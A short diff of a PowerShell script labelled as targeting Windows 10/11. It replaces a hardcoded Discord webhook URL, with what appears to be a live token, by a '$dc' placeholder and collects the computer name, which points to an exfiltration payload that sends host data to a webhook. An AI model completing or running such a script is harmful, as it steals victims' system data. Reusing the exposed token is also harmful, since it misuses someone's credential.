@@ -3,7 +3,7 @@
 # Target: Windows 10/11 
 
 # Define the webhook URL
-$webhook = 'https://discord.com/api/webhooks/1310354724846829639/rdpNjafo98okiC97JBXIxDl_23UKsiutlFsxcYv5OI-AfkAr5Wo5Jkxt9Jzgs5OmUTkg'
+$webhook = '$dc'
 
 # Get the computer name
 $computerName = $env:COMPUTERNAME
